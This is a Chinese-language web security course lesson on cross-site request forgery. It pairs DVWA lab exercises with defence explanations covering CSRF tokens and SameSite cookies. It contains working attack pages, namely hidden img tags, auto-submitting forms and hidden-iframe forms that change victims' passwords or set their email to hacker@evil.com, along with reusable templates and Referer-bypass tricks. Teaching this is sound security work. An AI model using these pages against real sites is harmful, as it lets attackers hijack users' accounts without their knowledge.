---
title: Day041：CSRF 原理与攻击链构造
tags:
  - 网络安全
  - CSRF
  - Web安全
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d041
date: 2026-03-04
updated: 2026-01-28
---

# Day041：CSRF 原理与攻击链构造

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 7：XSS 进阶与 CSRF |
| **今日主题** | CSRF 原理与攻击构造 |
| **预计时间** | 3 小时 |
| **难度等级** | 进阶 |

---

## 今日痛点场景

> **场景**：用户 A 登录了银行网站，然后访问了一个"有趣的图片"网站。回来发现，银行账户被转走了 10 万块！
>
> **问题**：A 什么都没做，钱怎么就没了？
>
> **今天的任务**：学习 CSRF（跨站请求伪造）——让受害者"帮"你干活的攻击。

---

## 今日目标

- [ ] 理解 CSRF 的攻击原理
- [ ] 能构造 CSRF 攻击页面
- [ ] 了解 CSRF Token 防御机制
- [ ] 掌握基本的绕过技巧

**闯关条件**：成功构造一个 CSRF 攻击，修改目标用户的密码。

---

## 实战任务（先动手！）

### 任务 1：理解 CSRF 原理（20 分钟）

**CSRF 攻击流程**：

```
1. 用户登录正常网站 bank.com，获得登录 Cookie
2. 用户访问恶意网站 evil.com
3. evil.com 页面包含一个隐藏的请求：
   <img src="http://bank.com/transfer?to=hacker&amount=100000">
4. 浏览器自动携带 bank.com 的 Cookie 发送请求
5. bank.com 认为是用户自己的请求，执行转账
```

**关键点**：
- 浏览器会自动携带目标网站的 Cookie
- 服务器只验证 Cookie，不验证请求来源
- 用户在不知情的情况下完成了操作

**记录**：
```
CSRF 的本质：________________
```

---

### 任务 2：GET 型 CSRF 实战（30 分钟）

**环境**：DVWA - CSRF - Low

**场景**：修改密码的请求

**分析请求**：
```
GET /dvwa/vulnerabilities/csrf/?password_new=test&password_conf=test&Change=Change HTTP/1.1
Host: target.com
Cookie: security=low; PHPSESSID=xxx
```

**构造攻击页面**：
```html
<!DOCTYPE html>
<html>
<head><title>有趣的图片</title></head>
<body>
  <h1>看看这只可爱的猫咪！</h1>
  <!-- 隐藏的 CSRF 攻击 -->
  <img src="http://target.com/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none">
</body>
</html>
```

**操作步骤**：
1. 登录 DVWA
2. 用另一个标签页打开攻击页面
3. 回到 DVWA，尝试用新密码 `hacked` 登录

**记录**：
```
攻击是否成功：________________
新密码：________________
```

---

### 任务 3：POST 型 CSRF 实战（40 分钟）

**场景**：目标使用 POST 请求

**分析请求**：
```
POST /change-email HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=test@test.com
```

**构造攻击页面（自动提交表单）**：
```html
<!DOCTYPE html>
<html>
<body>
  <h1>点击领取红包！</h1>
  <!-- 隐藏的表单 -->
  <form id="csrf-form" action="http://target.com/change-email" method="POST" style="display:none">
    <input type="hidden" name="email" value="hacker@evil.com">
  </form>
  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

**需要点击触发版本**：
```html
<!DOCTYPE html>
<html>
<body>
  <form action="http://target.com/change-email" method="POST">
    <input type="hidden" name="email" value="hacker@evil.com">
    <input type="submit" value="点击领取 100 元红包！">
  </form>
</body>
</html>
```

**记录**：
```
攻击是否成功：________________
```

---

### 任务 4：使用 iframe 隐藏攻击（25 分钟）

**更隐蔽的攻击方式**：
```html
<!DOCTYPE html>
<html>
<body>
  <h1>正常页面内容</h1>

  <!-- 隐藏的 iframe -->
  <iframe style="display:none" name="csrf-frame"></iframe>

  <form id="csrf-form" action="http://target.com/change-password" method="POST" target="csrf-frame">
    <input type="hidden" name="new_password" value="pwned123">
    <input type="hidden" name="confirm_password" value="pwned123">
  </form>

  <script>
    document.getElementById('csrf-form').submit();
  </script>
</body>
</html>
```

**优点**：
- 用户看不到页面跳转
- 攻击在后台静默完成

**记录**：
```
iframe 攻击的优势：________________
```

---

### 任务 5：CSRF Token 分析（35 分钟）

**DVWA High 级别防护**：

```html
<!-- 表单中包含 Token -->
<form action="/change-password" method="POST">
  <input type="hidden" name="csrf_token" value="abc123xyz789">
  <input type="password" name="new_password">
  <input type="submit">
</form>
```

**服务器验证逻辑**：
```php
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token validation failed');
}
```

**Token 有效性检测**：
1. 提交正常请求，观察是否有 token 参数
2. 删除或修改 token，观察是否被拦截
3. 使用另一个会话的 token，观察是否被拦截

**记录**：
```
Token 参数名：________________
Token 验证是否有效：________________
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 理解 CSRF 原理 | 20 分 |
| 成功构造 GET 型 CSRF | 25 分 |
| 成功构造 POST 型 CSRF | 25 分 |
| 掌握 iframe 隐藏技术 | 15 分 |
| 理解 CSRF Token 防御 | 15 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### CSRF vs XSS

| 对比项 | CSRF | XSS |
|--------|------|-----|
| 攻击目标 | 利用用户身份执行操作 | 窃取用户信息/执行代码 |
| 恶意代码位置 | 攻击者自己的网站 | 目标网站 |
| 是否需要登录 | 需要用户已登录 | 不一定 |
| 攻击者获得 | 操作结果 | 数据/会话 |

### SameSite Cookie 防护

```
Set-Cookie: session=abc; SameSite=Strict
- Strict：完全禁止第三方请求携带 Cookie
- Lax：允许 GET 导航请求携带（默认值）
- None：允许所有跨站请求携带（需要 Secure）
```

**现代浏览器默认行为**：
- Chrome 80+ 默认 SameSite=Lax
- 这使得 POST 型 CSRF 变得困难

### CSRF Token 生成

```php
// 安全的 Token 生成
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// 验证
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('Invalid CSRF token');
}
```

### 其他防御措施

| 防御方式 | 原理 | 绕过难度 |
|----------|------|----------|
| CSRF Token | 每个表单唯一令牌 | 难（除非有 XSS） |
| Referer 验证 | 检查请求来源 | 中（可被篡改） |
| SameSite Cookie | 浏览器层防护 | 难（浏览器支持） |
| 验证码 | 人工验证 | 难（用户体验差） |

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| SameSite 阻止 | Cookie 不被携带 | 检查 Cookie 设置，可能需要用户点击触发 |
| JSON 请求 | Content-Type 不对 | 某些服务器只接受特定 Content-Type |
| 跨域限制 | 请求被阻止 | 使用表单提交而非 AJAX |
| Referer 检查 | 请求被拒绝 | 尝试空 Referer 或绕过 |

---

## 知识卡片速查

### CSRF 攻击模板

**GET 型**：
```html
<img src="http://target.com/action?param=value">
<script src="http://target.com/action?param=value"></script>
<link href="http://target.com/action?param=value">
```

**POST 型（自动提交）**：
```html
<form id="f" action="http://target.com/action" method="POST">
  <input type="hidden" name="param" value="value">
</form>
<script>document.getElementById('f').submit();</script>
```

**POST 型（iframe 隐藏）**：
```html
<iframe style="display:none" name="csrf"></iframe>
<form action="http://target.com/action" method="POST" target="csrf">
  <input type="hidden" name="param" value="value">
</form>
<script>document.forms[0].submit();</script>
```

### 绕过 Referer 检查

```html
<!-- 方法 1：使用 data: 协议（无 Referer） -->
<meta name="referrer" content="no-referrer">

<!-- 方法 2：利用子域名（如果只检查包含）-->
<!-- 创建 target.com.evil.com 来绕过 -->
```

---

## 常见问题

**Q1：CSRF 和 SSRF 有什么区别？**

A1：
- CSRF（Cross-Site Request Forgery）：利用**用户的浏览器**发起请求
- SSRF（Server-Side Request Forgery）：利用**服务器**发起请求
- CSRF 攻击用户，SSRF 攻击服务器

**Q2：为什么 JSON API 不容易被 CSRF 攻击？**

A2：
1. 表单提交无法设置 `Content-Type: application/json`
2. 用 AJAX 发送会触发 CORS 预检请求
3. 但如果服务器接受 `text/plain`，仍可能被攻击

**Q3：有了 CSRF Token 就安全了吗？**

A3：不一定：
1. Token 可能在 URL 中泄露（Referer）
2. 如果存在 XSS，可以读取 Token
3. Token 验证可能有逻辑漏洞

---

## 明日预告

**Day 042：CSRF 防御绕过与高级利用**

明天你将：
- 学习 CSRF Token 绕过技巧
- 掌握 CSRF + XSS 组合攻击
- 了解 JSON CSRF 攻击

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 成功的 CSRF 攻击 | |
| 遇到的防护措施 | |
| 今日收获 | |

---

> **导师点评**：
>
> CSRF 是"借刀杀人"——让受害者的浏览器帮你干脏活。
>
> 这种攻击看起来简单，但影响可能巨大：改密码、转账、删数据，只要用户能做的，攻击者都能让用户"帮"着做。
>
> 好消息是，现代浏览器的 SameSite 默认策略让 CSRF 变难了。但在老系统、内网应用、手机 App 的 WebView 中，CSRF 依然是威胁。
>
> **记住：安全不是"不可能"，而是"成本够不够高"**。

```bash
echo "Day 041 Complete! CSRF 攻击入门！"
```
